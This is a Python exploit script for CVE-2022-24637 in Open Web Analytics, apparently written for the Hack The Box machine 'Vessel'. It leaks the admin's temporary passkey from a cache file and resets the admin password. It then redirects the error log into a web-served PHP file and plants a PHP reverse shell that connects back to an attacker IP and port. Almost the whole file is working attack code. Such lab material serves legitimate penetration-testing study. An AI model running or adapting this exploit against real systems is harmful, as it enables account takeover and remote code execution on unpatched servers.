'''
this script is for CVE-2022-24637
this script is for HTB machine Vessel

Open Web Analytics < 1.7.3
github : https://github.com/Open-Web-Analytics/Open-Web-Analytics


references : https://github.com/Open-Web-Analytics/Open-Web-Analytics/issues/681
           : https://devel0pment.de/?p=2494

http://openwebanalytics.vessel.htb/owa-data/caches/1/owa_user/c30da9265ba0a4704db9229f864c9eb7.php
http://openwebanalytics.vessel.htb/owa_web/owa-data/caches/1/owa_user/c30da9265ba0a4704db9229f864c9eb7.php


usage : python poc.py http://openwebanalytics.vessel.htb ATTACKER_IP ATTACKER_LISTNER

        python poc.py http://openwebanalytics.vessel.htb 10.10.14.5 9001


'''



#from termcolor import colored
import string
import re
import random
import requests
import base64
import hashlib
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# id=md5("user_id"+id_in_db) accroding to https://github.com/Open-Web-Analytics/Open-Web-Analytics/issues/681
base_url = sys.argv[1]
attacker_ip = sys.argv[2]
attacker_port = sys.argv[3]

cache_file_path = '/owa-data/caches/1/owa_user/'



letters = string.ascii_letters
random_name = ''.join(random.choice(letters) for i in range(10))

id_data = "user_id"+str(1) # acoount admin id_in_db could be 1
id_number = hashlib.md5(id_data.encode())
final_id = id_number.hexdigest()
cache_file_name = str(final_id) + '.php'
my_password = 'helloworld1' #change your password here
reverse_shell = '<?php $sock=fsockopen("' + attacker_ip + '",'+ attacker_port + ');$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);?>'
shell_filename = f'{random_name}.php'
shell_url = base_url + '/owa-data/caches/' + shell_filename


# def print_message(message, type):
#   if type == 'SUCCESS':
#       print('[' + colored('SUCCESS', 'green') +  '] ' + message)
#   elif type == 'INFO':
#       print('[' + colored('INFO', 'blue') +  '] ' + message)
#   elif type == 'WARNING':
#       print('[' + colored('WARNING', 'yellow') +  '] ' + message)
#   elif type == 'ALERT':
#       print('[' + colored('ALERT', 'yellow') +  '] ' + message)
#   elif type == 'ERROR':
#       print('[' + colored('ERROR', 'red') +  '] ' + message)


proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}


def get_update_nonce(url):
  try:
      session = requests.Session()   #????
      update_nonce_request = session.get(url, proxies=proxies)
      regex_update_nonce = r'owa_nonce" value="(\w*)"'
      update_nonce = re.search(regex_update_nonce, update_nonce_request.text).group(1)
  except Exception as e:
      print('An error occurred when attempting to update config!', "ERROR")
      print(e)
      exit()
  else:
      return update_nonce


def check_cahchefile(url):
    normal_ua = 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0'
    header = {
          'User-Agent': normal_ua
          }
    try:
        r = requests.get(url, headers=header, verify=False, timeout=10)
        return r.status_code
    except Exception as e:
        print('[-] something wrong : ' + str(e))
        sys.exit()
        

def get_php_cache_file(url):

    normal_ua = 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0'
    header = {
          'User-Agent': normal_ua
          }
    try:
        r = requests.get(url, headers=header, verify=False, timeout=10)
        if r.status_code != 404:
            result = r.text
            result_base64encode = base64.b64encode(bytes(result, 'utf-8'))
            return result_base64encode.decode('utf-8')
        else:
            return r.status_code
    except Exception as e:
        return e


def get_pass_key(response_data):
    
    result_base64encode = response_data.replace('PD9waHBcbi8q','').replace('Ki9cbj8+','') + '=='
    decode_first_time = base64.b64decode(result_base64encode)
    decode_second_time = base64.b64decode(decode_first_time).decode('utf-8')
    res= decode_second_time[decode_second_time.find('temp_passkey'):]
    res2 = res.split(';')
    tmp_key = res2[4].replace('"','').split(':')[2]
    return tmp_key


def admin_login(url):
    login_url = url + '/index.php?owa_do=base.loginForm&owa_site_id=&'
    normal_ua = 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0'


    header = {
          'User-Agent': normal_ua
          }
    #owa_user_id=admin&owa_password=aaaa&owa_go=&owa_action=base.login&owa_submit_btn=Login
    payload = {'owa_user_id':'admin','owa_password':'thisispassword','owa_go':'','owa_action':'base.login','owa_submit_btn':'Login'}

    try:
        r = requests.post(login_url, headers=header, data=payload, timeout=10) #,proxies=proxies
        result = r.text
        if 'Login Failed!' in result:
            return True
        else:
            return False
    except Exception as e:
        return e

def change_password(tmp_key,password,url):
    change_password_url = url + '/index.php?owa_do=base.usersChangePassword'
    normal_ua = 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0'
    header = {
          'User-Agent': normal_ua
          }
    #owa_password=123456&owa_password2=123456&owa_k=&owa_action=base.usersChangePassword&owa_submit_btn=Save+Your+New+Password
    payload = {'owa_password':password,'owa_password2':password,'owa_k':tmp_key,'owa_action':'base.usersChangePassword','owa_submit_btn':'Save+Your+New+Password'}
    try:
        r = requests.post(change_password_url, headers=header, data=payload, timeout=10) #,proxies=proxies
        result = r.text
        if 'Success!' in result:
            return True
        else:
            return False
    except Exception as e:
        return e


def write_php_shell(url,password,shell,shell_filename,shell_url):
    

    login_url = url + '/index.php?owa_do=base.loginForm&owa_site_id=&'
    update_config_url = base_url + "/index.php?owa_do=base.optionsGeneral"
    normal_ua = 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0'
    log_location = "/var/www/html/owa/owa-data/caches/" + shell_filename

    header = {
          'User-Agent': normal_ua
          }
    #owa_user_id=admin&owa_password=aaaa&owa_go=&owa_action=base.login&owa_submit_btn=Login
    #use admin and changed password to login
    
    payload = {'owa_user_id':'admin','owa_password':password,'owa_action':'base.login','owa_submit_btn':'Login'}
    
    session = requests.Session()
    
    print("[+] try to login as admin with password helloworld1")
    try:
        session.post(login_url,headers=header,data=payload,verify=False, timeout=10) #,proxies=proxies  proxy
    except Exception as e:
        print(e)
        print("[-] something went to wrong when login")
        sys.exit()
    try:
        update_nonce_request = session.get(update_config_url,verify=False, timeout=10) #,proxies=proxies  proxy
        regex_update_nonce = r'owa_nonce" value="(\w*)"'
        update_nonce = re.search(regex_update_nonce, update_nonce_request.text).group(1)
    except Exception as e:
      print('An error occurred when attempting to update config!', "ERROR")
      print(e)
      exit()
    try:
        print(f"[+] Creating log file shell name ---> {shell_filename}")
        payload2 = {"owa_nonce":update_nonce,"owa_action": "base.optionsUpdate","owa_config[base.error_log_file]": log_location,"owa_config[base.error_log_level]": 2}
        session.post(update_config_url, data=payload2,verify=False, timeout=10) #,proxies=proxies  proxy
    except Exception as e:
        print(e)
        print("[-] something went to wrong when write php file")
        sys.exit()
    try:
        print("[+] Wrote payload to log file")
        payload3 =  {"owa_nonce":update_nonce,"owa_action": "base.optionsUpdate","owa_config[shell]": shell}
        session.post(update_config_url, data=payload3,verify=False, timeout=10) #,proxies=proxies  proxy
    except Exception as e:
        print(e)
        print("[-] something went to wrong when update php file")
        sys.exit()
    try:
        print("[+] Try to trigger your payload, check your listener")
        session.get(shell_url)
    except Exception as e:
        print(e)
        print("[-] something went to wrong when trigger payload")
        sys.exit()


if __name__ == '__main__':
    
    #target url
    final_url = base_url +cache_file_path +cache_file_name
    print("[+] target url ----> " + final_url)
    
    check_status_code = check_cahchefile(final_url)
    #print(check_status_code)
    if check_status_code == 200:
        print('[+] found cache file')
        cache_result_base64encode = get_php_cache_file(final_url)
    if check_status_code == 404:
        print('[-] no cache file found, try to login as admin')
        admin_login(base_url)
        cache_result_base64encode = get_php_cache_file(final_url)

    #get base64ed cache string
    cache_result_base64encode = get_php_cache_file(final_url)
    
    #decode base64 and get tmp_pass
    tmp_pass = get_pass_key(cache_result_base64encode)
    print("[+] extracting tmp_key -----> " + tmp_pass)
    print(f"[+] changing admin password to {my_password}")
    
    change_result = change_password(tmp_pass,my_password,base_url)
    if change_result == True:
        print(f"[+] change admin password success ! you can login as admin with password {my_password}")
    else:
        print("[-] something is wrong, exit")
    
    write_php_shell(base_url,my_password,reverse_shell,shell_filename,shell_url)
    sys.exit()